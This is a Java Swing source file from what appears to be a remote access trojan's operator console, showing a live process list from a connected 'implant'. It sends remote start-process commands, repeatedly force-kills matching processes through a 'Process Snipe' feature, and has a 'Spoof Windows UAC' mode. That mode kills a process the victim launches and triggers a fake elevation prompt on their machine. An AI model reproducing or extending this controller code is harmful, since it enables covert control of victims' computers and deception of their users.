/**
 * The purpose of this class is to display a frame for the user to have a private terminal just with the connected client
 * 
 * 
 * @author Solomon Sonya
 */

package RunningProcess;

import Controller.*;

import java.awt.Frame;
import javax.swing.JFrame;
import java.awt.Dimension;
import javax.swing.*;
import java.lang.*;
import java.awt.Frame;
import javax.swing.border.*;

import java.awt.*;

import javax.swing.ImageIcon;
import javax.swing.JCheckBox;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.SwingConstants;
import javax.swing.Timer;
import javax.swing.UIManager;

import java.awt.Rectangle;
import java.awt.BorderLayout;
import javax.swing.JLabel ;
import java.lang.*;
import java.awt.Label;
import java.awt.event.KeyEvent;
import java.awt.Panel;
import java.awt.SystemColor;
import javax.swing.JRadioButton;
import java.text.*;
import java.util.*;
import java.awt.Color;
import java.awt.Font;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import javax.swing.JPanel;
import javax.swing.JSlider;
import java.awt.event.*;
import java.awt.Point;
import javax.swing.BorderFactory;
import javax.swing.border.EtchedBorder;
import javax.swing.border.TitledBorder;
import java.awt.ScrollPane;
import javax.swing.border.BevelBorder;
import javax.swing.border.SoftBevelBorder;
import javax.swing.text.DefaultStyledDocument;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;
import javax.swing.text.StyledDocument;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;
import java.awt.Button;
import javax.swing.JButton;
import javax.swing.JTextField;
import java.awt.Choice;
import javax.swing.JComboBox;
import java.net.*;
import javax.swing.WindowConstants;
import javax.swing.table.*;
import java.awt.event.*;
import Controller.Drivers.Drivers;
import Controller.GUI.JPanel_MainControllerWindow;
import Controller.GUI.JTable_Solomon;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;

import java.io.*;
import java.awt.GridBagLayout;

public class Frame_RunningProcessList extends JFrame implements ActionListener //<-- ActionEvents handled in the JPanel_MainControllerWindow!
{

	String strMyClassName = "Frame_RunningProcessList";
	
	JPanel jpnlMain = new JPanel(new BorderLayout());
	JPanel jpnlOverhead = new JPanel(new BorderLayout());
		public JLabel jlblConnectedAgentInfo = null;
		JLabel jlblRunningProcessListAsOf = new JLabel("Running Process List", JLabel.CENTER);
	
	JCheckBox jcbPauseUpdate = new JCheckBox("Pause Update", false);
	
		
	public JTable_Solomon jtblProcessList = null;
	public static final String [] arrJTableProcessListColNames  = new String[]{"Image Name","PID","Session Name","Session#","Mem Usage","Status","User Name","CPU Time","Window Title"};		
	public static Vector<String> vctJTableProcessListColNames = new Vector<String>(1,1);
	public static Vector<String> vctJTableProcessListToolTips = new Vector<String>(1,1);
	
	Thread_Terminal myThread = null;
		
	int myLoadIndex = 0;
	
	public ArrayList<Node_RunningProcess> alCurrentDisplayedProcesses = new ArrayList<Node_RunningProcess>();
	public ArrayList<Node_RunningProcess> alNewProcesses = new ArrayList<Node_RunningProcess>();
	
	
	Timer tmrRefreshJTable = null;
	public volatile boolean processInterrupt_RefreshJTable = false;
	
	JPanel jpnlOptions = new JPanel(new BorderLayout(4,4));
		JPanel jpnlFiler_Alignment = new JPanel(new BorderLayout());
			JLabel jlblFilterProcess = new JLabel("Filter Process: ", JLabel.RIGHT);
			JPanel jpnlFilter = new JPanel(new GridLayout(2, 9, 1, 1));
				JLabel jlblImageName = new JLabel("Image Name:", JLabel.CENTER);
				JTextField jtfImageName = new JTextField(12);
				JLabel jlblPID = new JLabel("PID:", JLabel.CENTER);
				JTextField jtfPID = new JTextField(12);
				JLabel jlblSessionName= new JLabel("Session Name:", JLabel.CENTER);
				JTextField jtfSessionName = new JTextField(12);
				JLabel jlblSessionNum= new JLabel("Session #:", JLabel.CENTER);
				JTextField jtfSessionNum = new JTextField(12);
				JLabel jlblMemUsage= new JLabel("Mem Usage:", JLabel.CENTER);
				JTextField jtfMemUsage = new JTextField(12);
				JLabel jlblStatus= new JLabel("Status:", JLabel.CENTER);
				JTextField jtfStatus = new JTextField(12);
				JLabel jlblUserName= new JLabel("User Name:", JLabel.CENTER);
				JTextField jtfUserName = new JTextField(12);
				JLabel jlblCPU= new JLabel("CPU Time", JLabel.CENTER);
				JTextField jtfCPU = new JTextField(12);
				JLabel jlblWindowTitle= new JLabel("Window Title:", JLabel.CENTER);
				JTextField jtfWindowTitle = new JTextField(12);
			JCheckBox jcbEnabled_ProcessList = new JCheckBox("Enable Filter    ", false);
			
		JPanel jpnlOptions_Center = new JPanel(new BorderLayout(4,4));
			
		JPanel jpnlPersistenKill = new JPanel(new BorderLayout());
			JLabel jlblPersistenKillProcess = new JLabel("           Process Snipe: ", JLabel.RIGHT);
			JTextField jtfPersistentKillProcess = new JTextField(20);
			JCheckBox jcbEnabled_ProcessKill = new JCheckBox("Engage Sniper", false);
			
		JPanel jpnlStartProcess = new JPanel(new BorderLayout());
			JLabel jlblStartProcess = new JLabel("             Start Process: ");
			JTextField jtfStartProcess = new JTextField(20);
			JButton jbtnStartProcess = new JButton("Start Process");
			
		JPanel jpnlWindowsUAC = new JPanel(new BorderLayout());
			JLabel jlblSpoofWindowsUAC = new JLabel(" Spoof Windows UAC: ");
			JTextField jtfSpoofWindowsUAC = new JTextField(20);
			JCheckBox jcbEnabled_UAC_Spoof = new JCheckBox("Engage Spoof", false);
		
		
		public volatile boolean filterEnabled_ProcessList = false;
		public volatile boolean filterEnabled_ProcessKill = false;
		public volatile boolean filterEnabled_WindowsUAC = false;
		
		String [] arrProcessList = null;
		String singleProcess = "";
		JTextField jtfToFilter = null;
		String token = "";
		boolean addProcessToJTable = false;
		
		public final int 	switch_imageNameVal = 0,
				switch_pidVal = 1,
				switch_sessionNameVal = 2,
				switch_sessionNumVal = 3,
				switch_memUsageVal = 4,
				switch_statusVal = 5,
				switch_userNameVal = 6,
				switch_cpuTime = 7,
				switch_windowTitle = 8,
				switch_PersistentProcessKill = 9,
				switch_WindowsUAC_Spoof = 10;
		
		JPanel jpnlFilterOption = new JPanel(new BorderLayout());
			JLabel jlblProcessFilterEnabled = new JLabel("   Process Filter Enabled   ", JLabel.CENTER);
			JLabel jlblProcessKillEnabled = new JLabel("   Process Snipe Enabled   ", JLabel.CENTER);
			JLabel jlblDismissUpdateEnabled = new JLabel("   Pause Updates Enabled   ", JLabel.CENTER);
			JLabel jlblWindowsUACEnabled = new JLabel("  UAC Spoof Enabled ", JLabel.CENTER);
		
	JPanel jpnlAlerts_Center = new JPanel(new BorderLayout());
			
	public Frame_RunningProcessList(int loadIndex, Thread_Terminal thread)
	{
		try
		{
			//save my thread
			myThread = thread;  myThread.frameRunningProcessIsDisposed = false;//ensure thread knows not to dismiss the alerts
			myLoadIndex = loadIndex;		
			this.setTitle("Running Process List For Terminal @" + thread.getRHOST_IP());
			
			try	
			{	//RAT ICON
				this.setIconImage(Drivers.imgFrameIcon);
			}	catch(Exception e){}
			
			try	{	this.myThread.pauseRunningProcessUpdate = false;}catch(Exception e){}
			
			getContentPane().add(this.jpnlMain);
			
			this.jpnlMain.add(BorderLayout.NORTH, this.jpnlOverhead);			
			
			setBounds(500, 200, 850, 550);
			
			jlblConnectedAgentInfo = new JLabel("Terminal is connected to " + thread.getJListData(), JLabel.CENTER);
			jlblConnectedAgentInfo.setFont(new Font("Courier", Font.BOLD, 18));
			jlblRunningProcessListAsOf.setFont(new Font("Courier", Font.BOLD, 14));
			
			this.jpnlOverhead.add(BorderLayout.NORTH, jlblConnectedAgentInfo);			

			this.jpnlOverhead.add(BorderLayout.CENTER, 	jlblRunningProcessListAsOf);
			jpnlOverhead.add(BorderLayout.EAST, jcbPauseUpdate);
			jpnlFilterOption.add(BorderLayout.WEST, this.jlblProcessFilterEnabled);
			jpnlAlerts_Center.add(BorderLayout.CENTER, this.jlblProcessKillEnabled);
			jpnlAlerts_Center.add(BorderLayout.EAST, this.jlblWindowsUACEnabled);
			jpnlFilterOption.add(BorderLayout.CENTER, jpnlAlerts_Center);
			jpnlFilterOption.add(BorderLayout.EAST, this.jlblDismissUpdateEnabled);
			jlblProcessFilterEnabled.setOpaque(true);
			jlblProcessKillEnabled.setOpaque(true);
			jlblDismissUpdateEnabled.setOpaque(true);
			jlblWindowsUACEnabled.setOpaque(true);
			jlblProcessFilterEnabled.setBackground(Color.green.darker().darker());
			jlblProcessFilterEnabled.setForeground(Color.white);
			jlblProcessKillEnabled.setBackground(Color.red);
			jlblWindowsUACEnabled.setBackground(Color.BLACK);
			jlblWindowsUACEnabled.setForeground(Color.white);
			jlblProcessKillEnabled.setForeground(Color.white);
			jlblDismissUpdateEnabled.setBackground(Color.blue.darker());
			jlblDismissUpdateEnabled.setForeground(Color.white);
			jlblProcessKillEnabled.setVisible(false);
			jlblProcessFilterEnabled.setVisible(false);
			jlblDismissUpdateEnabled.setVisible(false);
			jlblWindowsUACEnabled.setVisible(false);
			jlblProcessFilterEnabled.setFont(new Font("Courier", Font.BOLD, 14));
			jlblProcessKillEnabled.setFont(new Font("Courier", Font.BOLD, 14));
			jlblDismissUpdateEnabled.setFont(new Font("Courier", Font.BOLD, 14));
			jlblWindowsUACEnabled.setFont(new Font("Courier", Font.BOLD, 14));
			jpnlOverhead.add(BorderLayout.SOUTH, jpnlFilterOption);

			//populate the vector of col headers for the jtable
			
			try
			{
				vctJTableProcessListColNames.clear();
				vctJTableProcessListToolTips.clear();
				
			}catch(Exception e){}
			
			for(int i = 0; i < this.arrJTableProcessListColNames.length; i++)					
			{
				vctJTableProcessListColNames.add(arrJTableProcessListColNames[i]);
				vctJTableProcessListToolTips.add(arrJTableProcessListColNames[i]);
			}

			//now populate the jtable!
			this.jtblProcessList = new JTable_Solomon(vctJTableProcessListColNames, vctJTableProcessListToolTips, "RUNNING PROCESS LIST", Color.blue.darker(), null);
			jtblProcessList.clrDefaultBackground = Drivers.clrBackground;
			jtblProcessList.clrDefaultForeground = Drivers.clrImplant;
			
			
			//
			this.jpnlMain.add(BorderLayout.CENTER, this.jtblProcessList);

			this.jtblProcessList.jbtnDisconnectImplant.setVisible(false);
			this.jtblProcessList.jbtnGoogleMap.setVisible(false);

			//disable previous initiated timer
			try	{	jtblProcessList.tmrUpdateJTable.stop();}catch(Exception e){}

			//jtblProcessList

			this.processInterrupt_RefreshJTable = false;
			tmrRefreshJTable = new Timer(Driver.THREAD_REFRESH_JTABLE_RUNNING_PROCESS_LIST_INTERVAL_MILLIS, this);
			tmrRefreshJTable.start();

			this.jtblProcessList.jbtnRefresh.setVisible(false);
			this.jtblProcessList.jcbEnableGPS_Resolution.setVisible(false);
			
			//JPanel Options
			this.jpnlOptions.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Filter Options", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 51, 255)));
			
			jpnlFilter.add(jlblImageName);
			jpnlFilter.add(jlblPID);
			jpnlFilter.add(jlblSessionName);
			jpnlFilter.add(jlblSessionNum);
			jpnlFilter.add(jlblMemUsage);
			jpnlFilter.add(jlblStatus);
			jpnlFilter.add(jlblUserName);
			jpnlFilter.add(jlblCPU);
			jpnlFilter.add(jlblWindowTitle);
			
			
			//jpnlFilter.add(new JLabel(""));
			
			jpnlFilter.add(jtfImageName);
			jpnlFilter.add(jtfPID);
			jpnlFilter.add(jtfSessionName);
			jpnlFilter.add(jtfSessionNum);
			jpnlFilter.add(jtfMemUsage);
			jpnlFilter.add(jtfStatus);
			jpnlFilter.add(jtfUserName);
			jpnlFilter.add(jtfCPU);
			jpnlFilter.add(jtfWindowTitle);
			
			
			//jpnlFiler_Alignment.add(BorderLayout.WEST, jlblFilterProcess);
			jpnlFiler_Alignment.add(BorderLayout.CENTER, jpnlFilter);
			jpnlFiler_Alignment.add(BorderLayout.EAST, jcbEnabled_ProcessList);
			
			
			jpnlPersistenKill.add(BorderLayout.WEST, jlblPersistenKillProcess);
			jpnlPersistenKill.add(BorderLayout.CENTER, jtfPersistentKillProcess);
			jpnlPersistenKill.add(BorderLayout.EAST, jcbEnabled_ProcessKill);
			
			
			jpnlStartProcess.add(BorderLayout.WEST, jlblStartProcess);
			jpnlStartProcess.add(BorderLayout.CENTER, jtfStartProcess);
			jpnlStartProcess.add(BorderLayout.EAST, jbtnStartProcess);				
			
			
			jpnlWindowsUAC.add(BorderLayout.WEST, jlblSpoofWindowsUAC);
			jpnlWindowsUAC.add(BorderLayout.CENTER,jtfSpoofWindowsUAC);
			jpnlWindowsUAC.add(BorderLayout.EAST, jcbEnabled_UAC_Spoof);
			
			jpnlOptions_Center.add(BorderLayout.CENTER, jpnlPersistenKill);
			jpnlOptions_Center.add(BorderLayout.SOUTH, jpnlWindowsUAC);
			
			
			jpnlOptions.add(BorderLayout.NORTH, jpnlFiler_Alignment);
			jpnlOptions.add(BorderLayout.CENTER, jpnlOptions_Center);
			jpnlOptions.add(BorderLayout.SOUTH,jpnlStartProcess);				
			
			
			getContentPane().add(BorderLayout.SOUTH, this.jpnlOptions);
			
			
			
			this.jcbEnabled_ProcessKill.addActionListener(this);
			this.jcbEnabled_ProcessList.addActionListener(this);
			jtfStartProcess.addActionListener(this);
			this.jbtnStartProcess.addActionListener(this);
			jcbPauseUpdate.addActionListener(this);
			this.jcbEnabled_UAC_Spoof.addActionListener(this);
			
			
			jlblPersistenKillProcess.setToolTipText("Persistent Kill Process");
			
			this.validate();
			
		}
		catch(Exception e)
		{
			Drivers.eop("Frame_RunningProcessList Constructor", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);


		this.addWindowListener(new java.awt.event.WindowAdapter() 
		{
			public void windowClosing(java.awt.event.WindowEvent e) 
			{
				myThread.closingRunningProcessFrame = true;
				closeFrame(); 			
			}
		});

	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == this.tmrRefreshJTable)
			{
				if(this.processInterrupt_RefreshJTable)
				{
					this.processInterrupt_RefreshJTable = false;
					refreshJTable();
					this.validate();
					this.jtblProcessList.validate();
				}
			}
			
			else if(ae.getSource() == this.jcbEnabled_ProcessKill)
			{
				this.filterEnabled_ProcessKill = this.jcbEnabled_ProcessKill.isSelected();
				jlblProcessKillEnabled.setVisible(filterEnabled_ProcessKill);
			}
			
			else if(ae.getSource() == this.jcbEnabled_ProcessList)
			{
				this.filterEnabled_ProcessList = this.jcbEnabled_ProcessList.isSelected();
				this.jlblProcessFilterEnabled.setVisible(filterEnabled_ProcessList);
			}
			
			else if(ae.getSource() == jcbPauseUpdate)
			{
				this.myThread.pauseRunningProcessUpdate = jcbPauseUpdate.isSelected();
				jlblDismissUpdateEnabled.setVisible(myThread.pauseRunningProcessUpdate );
			}
			
			else if(ae.getSource() == this.jcbEnabled_UAC_Spoof)
			{
				this.filterEnabled_WindowsUAC = jcbEnabled_UAC_Spoof.isSelected();
				this.jlblWindowsUACEnabled.setVisible(filterEnabled_WindowsUAC);
				
			}
			
			else if(ae.getSource() == this.jbtnStartProcess)
			{
				startProcess();
			}
			
			else if(ae.getSource() == this.jtfStartProcess)
			{
				startProcess();
			}
			
		}
		catch(Exception e)
		{
			Driver.eop("AE", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}
	
	private boolean startProcess()
	{
		try
		{
			String cmd = this.jtfStartProcess.getText();
			if(cmd == null || cmd.trim().equals(""))
			{
				Drivers.jop_Error("Empty Command received.  \nNo command to send!                      ", "Unable to completed selected action");
				return false;
			}
			
			else if(Drivers.jop_Confirm("You have chosen to issue command: " + cmd.trim() + "\nDo you wish to continue?", "WARNING!!! DO you want to send command?") == JOptionPane.YES_OPTION)
			{
				this.myThread.sendCommand_RAW("start " + cmd);
				this.jtfStartProcess.setText("");
			}
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("startProcess", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	private boolean filterProcessList(int switchVal, Node_RunningProcess processMap)//processMap == this.alCurrentDisplayedProcesses.get(i)
	{
		try
		{
			//decide which jtextfield to use
			switch(switchVal)
			{
				case switch_imageNameVal:
				{
					//configure the environment
					this.jtfToFilter = this.jtfImageName;
					token = processMap.myImageName;					
					
					break;
				}
				
				case switch_pidVal:
				{
					//configure the environment
					this.jtfToFilter = this.jtfPID;
					token = processMap.myPID;					
					
					break;
				}
				
				case switch_sessionNameVal:
				{
					//configure the environment
					this.jtfToFilter = this.jtfSessionName;
					token = processMap.mySessionName;					
					
					break;
				}
				
				case switch_sessionNumVal:
				{
					//configure the environment
					this.jtfToFilter = this.jtfSessionNum;
					token = processMap.mySessionNumber;					
					
					break;
				}
				
				case switch_memUsageVal:
				{
					//configure the environment
					this.jtfToFilter = this.jtfMemUsage;
					token = processMap.myMemUsage;					
					
					break;
				}
				
				case switch_statusVal:
				{
					//configure the environment
					this.jtfToFilter = this.jtfStatus;
					token = processMap.myStatus;					
					
					break;
				}
				
				case switch_userNameVal:
				{
					//configure the environment
					this.jtfToFilter = this.jtfUserName;
					token = processMap.myUserName;					
					
					break;
				}
				
				case switch_cpuTime:
				{
					//configure the environment
					this.jtfToFilter = this.jtfCPU;
					token = processMap.myCPU_Time;					
					
					break;
				}
				
				case switch_windowTitle:
				{
					//configure the environment
					this.jtfToFilter = this.jtfWindowTitle;
					token = processMap.myWindowTitle;					
					
					break;
				}
				case switch_PersistentProcessKill:
				{
					//configure the environment
					this.jtfToFilter = this.jtfPersistentKillProcess;
					token = processMap.myImageName;					
					
					break;
				}
				
				case switch_WindowsUAC_Spoof:
				{
					//configure the environment
					this.jtfToFilter = this.jtfSpoofWindowsUAC;
					token = processMap.myImageName;					
					
					break;
				}
			}//end switch
			
			//now that the environment has been configured, check on the values to know what to return
			if(this.jtfToFilter == null ||  token == null)
			{
				Driver.sop("Null Value Entered to filter in " + this.strMyClassName + " - Switch Val: " + switchVal + " ...skipping filter");
				return false;
			}
			
			
			//check if a imagename is selected
			if(jtfToFilter.getText() != null && !jtfToFilter.getText().trim().equals(""))
			{
				//get an array of the items chosen
				this.arrProcessList = jtfToFilter.getText().trim().split(Driver.FILTER_DELIMITER);
				
				//ENSURE WE HAVE SOMETHING
				if(this.arrProcessList != null && this.arrProcessList.length > 0)
				{
					//need to tell for *'s
					for(int j = 0; j < this.arrProcessList.length; j++)
					{
						singleProcess = this.arrProcessList[j];
						
						if(singleProcess != null && !singleProcess.trim().equals(""))
						{
							singleProcess = singleProcess.trim().toLowerCase();
							
							//check if the name is sandwiched inbetween *<name>*
							if(singleProcess.startsWith("*") && singleProcess.endsWith("*"))
							{
								singleProcess = singleProcess.replace("*", "");
								
								//only add if the processname ends with the string selected
								if(token != null && token.trim().toLowerCase().contains(singleProcess))
								{
									return true;
								}
							}
							
							//check if * is at the beginning
							if(singleProcess.startsWith("*"))
							{
								singleProcess = singleProcess.replace("*", "");
								
								//only add if the processname ends with the string selected
								if(token != null && token.trim().toLowerCase().endsWith(singleProcess))
								{
									return true;
								}
							}
							
							//check if * is at the end
							if(singleProcess.endsWith("*"))
							{
								singleProcess = singleProcess.replace("*", "");
								
								//only add if the processname ends with the string selected
								if(token != null && token.trim().toLowerCase().startsWith(singleProcess))
								{
									return true;
								}
							}
							
							//Check the full string: 
							if(token != null && token.trim().equalsIgnoreCase((singleProcess)))
							{
								return true;
							}
							
						}//end if(singleProcess != null && !singleProcess.trim().equals(""))
						
					}// end for(int j = 0; j < this.arrProcessList.length; j++)
					
				}//end if(this.arrProcessList != null && this.arrProcessList.length > 0)
						
			}//end if(jtfToFilter.getText() != null && !jtfToFilter.getText().trim().equals(""))
			
			
			
			
		}
		catch(Exception e)
		{
			Driver.eop("filterProcessList", this.strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	
	private boolean refreshJTable()
	{
		try
		{
			//remove previous data
			try	{this.jtblProcessList.removeAllRows();}catch(Exception e){}
			
			//add new data
			for(int i = 0; i < this.alCurrentDisplayedProcesses.size(); i++)
			{
				/*******************************************************************
				 * 
				 *
				 * FILTER ON PROCESS LIST
				 * 
				 * 
				 *******************************************************************/
				 
				
				//before adding, check if filters are enabled
				if(this.filterEnabled_ProcessList)
				{
					addProcessToJTable = false;//assume we don't add the value to the jtable. process the filter as logical OR's, any one of them coming back true means we'll add it
					
					//process through the filter methods and if we get a true, we'll add it to the jtable
					addProcessToJTable |= this.filterProcessList(this.switch_imageNameVal, this.alCurrentDisplayedProcesses.get(i));
					addProcessToJTable |= this.filterProcessList(this.switch_pidVal, this.alCurrentDisplayedProcesses.get(i));
					addProcessToJTable |= this.filterProcessList(this.switch_sessionNameVal, this.alCurrentDisplayedProcesses.get(i));
					addProcessToJTable |= this.filterProcessList(this.switch_sessionNumVal, this.alCurrentDisplayedProcesses.get(i));
					addProcessToJTable |= this.filterProcessList(this.switch_memUsageVal, this.alCurrentDisplayedProcesses.get(i));
					addProcessToJTable |= this.filterProcessList(this.switch_statusVal, this.alCurrentDisplayedProcesses.get(i));
					addProcessToJTable |= this.filterProcessList(this.switch_userNameVal, this.alCurrentDisplayedProcesses.get(i));
					addProcessToJTable |= this.filterProcessList(this.switch_cpuTime, this.alCurrentDisplayedProcesses.get(i));
					addProcessToJTable |= this.filterProcessList(this.switch_windowTitle, this.alCurrentDisplayedProcesses.get(i));
					
					//now check if any of them came back positive, we'll add it to the jtable
					if(this.addProcessToJTable)
					{
						this.jtblProcessList.addRow(alCurrentDisplayedProcesses.get(i).getRowData());
					}
					
					addProcessToJTable = false;//ensure we reset back again!
					
				}//end persistent process list filter
				
				else//simply display everything
				{
					this.jtblProcessList.addRow(alCurrentDisplayedProcesses.get(i).getRowData());
				}
				
				
				/*******************************************************************
				 * 
				 *
				 * FILTER ON PROCESS KILL
				 * 
				 * 
				 *******************************************************************/
				
				if(this.filterEnabled_ProcessKill)
				{
					//simply search, and if found, kill it
					
					//Search process through the filter methods and if we get a true, we'll add it to the jtable
					if(this.filterProcessList(this.switch_PersistentProcessKill, this.alCurrentDisplayedProcesses.get(i)))
					{
						//proceed, first check if we can see it, then if so, send a command to kill it!
						//Process found, kill it!!!
						Driver.sop("Process Found: [" + this.alCurrentDisplayedProcesses.get(i).myImageName + "] in implant " + this.myThread.getJListData() + " sending kill command!");
						
						//note, consider killing based on PID
						
						this.myThread.sendCommand_RAW("taskkill /f /im " + "\"" + this.alCurrentDisplayedProcesses.get(i).myImageName.trim() + "\"");
					}					
					
				}
				
				
				/*******************************************************************
				 * 
				 *
				 * FILTER ON WINDOWS UAC
				 * 
				 * NOTE[1]: WILL NEED TO COME BACK AND MODIFY SUCH THAT WHEN THE USER SAYS OK, 
				 * WE NEED TO CAPTURE THE FULL PATH TO THE FILE BEING EXECUTED, 
				 * I.E. USER CLICKS TO OPEN MAPS.TXT, WE NEED TO FIND THE FULL PATH OF FILE BEING EXECUTED
				 * TO RELAUNCH IT PROPERLY... THAT'LL BE IN THE NEXT UPDATE!
				 * 
				 * NOTE[2]: WILL NEED TO COME BACK AND GET THE FULL LAUNCH PATH OF THE EXECUTABLE, 
				 * RIGHT NOW, WE ASSUME THE PROGRAMS USING THIS ARE IN THE CURRENT PATH
				 *******************************************************************/
				
				if(this.filterEnabled_WindowsUAC)
				{
					//simply search, and if found, kill it, display UAC and if we get UAC correct, then we'll launch the program
					
					//Search process through the filter methods and if we get a true, we'll add it to the jtable
					if(this.filterProcessList(this.switch_WindowsUAC_Spoof, this.alCurrentDisplayedProcesses.get(i)))
					{
						//proceed, first check if we can see it, then if so, send a command to kill it!
						//Process found, kill it!!!
						Driver.sop("UAC Spoof Enabled. Process Found: [" + this.alCurrentDisplayedProcesses.get(i).myImageName + " PID: " +  this.alCurrentDisplayedProcesses.get(i).PID + "] in implant " + this.myThread.getJListData() + " spoofing UAC!");
						
						//note, consider killing based on PID						
						//this.myThread.sendCommand_RAW("taskkill /f /im " + "\"" + this.alCurrentDisplayedProcesses.get(i).myImageName.trim() + "\"");
						this.myThread.sendCommand_RAW("taskkill /f /pid " + " " + this.alCurrentDisplayedProcesses.get(i).PID );
						
						//SEND THE SPOOF COMMAND!
						//this.myThread.sendCommand_RAW(Driver.SPOOF_UAC + Driver.delimeter_1 + this.alCurrentDisplayedProcesses.get(i).myImageName.trim());
						this.myThread.sendCommand_RAW(Driver.SPOOF_UAC + "," + this.alCurrentDisplayedProcesses.get(i).myImageName.trim() + ", " + this.alCurrentDisplayedProcesses.get(i).myImageName.trim() );//FORMATTED TO BE TRAPPED BY THE sendCommand mtd for normalization
						
						//we sent the command, immediately disable this feature... it's too dangerous. have user re-enable each time
						this.jcbEnabled_UAC_Spoof.setSelected(false);
						this.filterEnabled_WindowsUAC = jcbEnabled_UAC_Spoof.isSelected();
						this.jlblWindowsUACEnabled.setVisible(filterEnabled_WindowsUAC);
						
					}					
					
				}
				
				
			}
			
			//preserve the sorting order
			jtblProcessList.sortJTable_ByRows(jtblProcessList.dfltTblMdl, jtblProcessList.jcbSortTableBy.getSelectedIndex(), jtblProcessList.sortInAscendingOrder);
			
			//display the update time
			this.jlblRunningProcessListAsOf.setText("Last Update Received at " + Driver.getTimeStamp_Without_Date());
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("refreshJTable", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	/*private boolean refreshJTable()
	{
		try
		{
			//remove previous data
			try	{this.jtblProcessList.removeAllRows();}catch(Exception e){}
			
			//add new data
			for(int i = 0; i < this.alCurrentDisplayedProcesses.size(); i++)
			{
				//before adding, check if filters are enabled
				if(this.filterEnabled_ProcessList)
				{
					//check if a imagename is selected
					if(this.jtfImageName.getText() != null && !this.jtfImageName.getText().trim().equals(""))
					{
						//get an array of the items chosen
						this.arrProcessList = this.jtfImageName.getText().trim().split(Driver.FILTER_DELIMITER);
						
						//ENSURE WE HAVE SOMETHING
						if(this.arrProcessList != null && this.arrProcessList.length > 0)
						{
							//need to tell for *'s
							for(int j = 0; j < this.arrProcessList.length; j++)
							{
								singleProcess = this.arrProcessList[j];
								
								if(singleProcess != null && !singleProcess.trim().equals(""))
								{
									singleProcess = singleProcess.trim().toLowerCase();
									
									//check if the name is sandwiched inbetween *<name>*
									if(singleProcess.startsWith("*") && singleProcess.endsWith("*"))
									{
										singleProcess = singleProcess.replace("*", "");
										
										//only add if the processname ends with the string selected
										if(this.alCurrentDisplayedProcesses.get(i).myImageName != null && this.alCurrentDisplayedProcesses.get(i).myImageName.trim().toLowerCase().contains(singleProcess))
										{
											this.jtblProcessList.addRow(alCurrentDisplayedProcesses.get(i).getRowData());
											continue;
										}
									}
									
									//check if * is at the beginning
									if(singleProcess.startsWith("*"))
									{
										singleProcess = singleProcess.replace("*", "");
										
										//only add if the processname ends with the string selected
										if(this.alCurrentDisplayedProcesses.get(i).myImageName != null && this.alCurrentDisplayedProcesses.get(i).myImageName.trim().toLowerCase().endsWith(singleProcess))
										{
											this.jtblProcessList.addRow(alCurrentDisplayedProcesses.get(i).getRowData());
											continue;
										}
									}
									
									//check if * is at the end
									if(singleProcess.endsWith("*"))
									{
										singleProcess = singleProcess.replace("*", "");
										
										//only add if the processname ends with the string selected
										if(this.alCurrentDisplayedProcesses.get(i).myImageName != null && this.alCurrentDisplayedProcesses.get(i).myImageName.trim().toLowerCase().startsWith(singleProcess))
										{
											this.jtblProcessList.addRow(alCurrentDisplayedProcesses.get(i).getRowData());
											continue;
										}
									}
									
									//Check the full string: 
									if(this.alCurrentDisplayedProcesses.get(i).myImageName != null && this.alCurrentDisplayedProcesses.get(i).myImageName.trim().equalsIgnoreCase((singleProcess)))
									{
										this.jtblProcessList.addRow(alCurrentDisplayedProcesses.get(i).getRowData());
										continue;
									}
									
								}//end if(singleProcess != null && !singleProcess.trim().equals(""))
								
							}// end for(int j = 0; j < this.arrProcessList.length; j++)
							
						}//end if(this.arrProcessList != null && this.arrProcessList.length > 0)
								
					}//end if(this.jtfImageName.getText() != null && !this.jtfImageName.getText().trim().equals(""))
					
				}//end if(this.filterEnabled_ProcessList)
				
				else//simply display everything
				{
					this.jtblProcessList.addRow(alCurrentDisplayedProcesses.get(i).getRowData());
				}
			}
			
			//preserve the sorting order
			jtblProcessList.sortJTable_ByRows(jtblProcessList.dfltTblMdl, jtblProcessList.jcbSortTableBy.getSelectedIndex(), jtblProcessList.sortInAscendingOrder);
			
			//display the update time
			this.jlblRunningProcessListAsOf.setText("Last Update Received at " + Driver.getTimeStamp_Without_Date());
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("refreshJTable", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}*/
	
	public void closeFrame()
	{
		try
		{
			if(myLoadIndex == JPanel_MainControllerWindow.INDEX_THIS_IS_RUNNING_PROCESS_)
			{
				myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.STOP_RUNNING_PROCESS_LIST);
			}
			
				
			this.myThread.pauseRunningProcessUpdate = false;
			
			myThread.frameRunningProcessIsDisposed = true;
			this.setVisible(false);
			this.dispose();
			
		}
		catch(Exception e)
		{
			Drivers.eop("closeFrame", strMyClassName, e, e.getLocalizedMessage(), false);
			this.dispose();
		}
	}
}
